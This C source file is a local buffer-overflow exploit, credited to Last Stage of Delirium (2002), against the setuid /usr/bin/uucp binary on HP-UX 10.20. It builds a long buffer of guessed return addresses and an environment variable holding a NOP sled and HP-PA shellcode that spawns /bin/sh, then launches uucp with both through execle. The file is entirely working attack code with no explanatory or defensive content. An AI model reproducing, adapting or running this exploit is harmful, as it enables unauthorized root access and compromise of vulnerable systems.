/*## copyright LAST STAGE OF DELIRIUM feb 2002 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/uucp                                                           #*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define ADRNUM 4096
#define NOPNUM 12000
#define PADNUM 3

char shellcode[]=
    "\xeb\x5f\x1f\xfd"    /* bl     .+8,%r26               */
    "\x0b\x39\x02\x99"    /* xor    %r25,%r25,%r25         */
    "\xb7\x5a\x40\x22"    /* addi,< 0x11,%r26,%r26         */
    "\x0f\x40\x12\x0e"    /* stbs   %r0,7(%r26)            */
    "\x20\x20\x08\x01"    /* ldil   L%0xc0000004,%r1       */
    "\xe4\x20\xe0\x08"    /* ble    R%0xc0000004(%sr7,%r1) */
    "\xb4\x16\x70\x16"    /* addi,> 0xb,%r0,%r22           */
    "/bin/sh"
;

char jump[]=
    "\xe0\x40\x00\x00"    /* be     0x0(%sr0,%rp)          */
    "\x37\xdc\x00\x00"    /* copy   %sp,%ret0              */
;

char nop[]="\x0a\xb5\x02\x95";
             
int main(int argc,char **argv){            
    char buffer[20000],adr[4],*b,*envp[2];  
    int i;   

    printf("copyright LAST STAGE OF DELIRIUM feb 2002 poland  //lsd-pl.net/\n");
    printf("/usr/bin/uucp HP-UX 10.20 700/800\n");    
             
    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-11536;
    printf("0x%x\n",*((unsigned long*)adr));

    envp[0]=&buffer[5000];
    envp[1]=0;

    b=buffer;
    for(i=0;i<ADRNUM;i++)  *b++=adr[i%4];
    *b=0;

    b=&buffer[5000];
    strcpy(b,"lsd=");b+=4;
    for(i=0;i<PADNUM;i++)  *b++=0x61;
    for(i=0;i<NOPNUM;i++)  *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;    

    execle("/usr/bin/uucp","lsd",buffer,"lsd",0,envp);
}

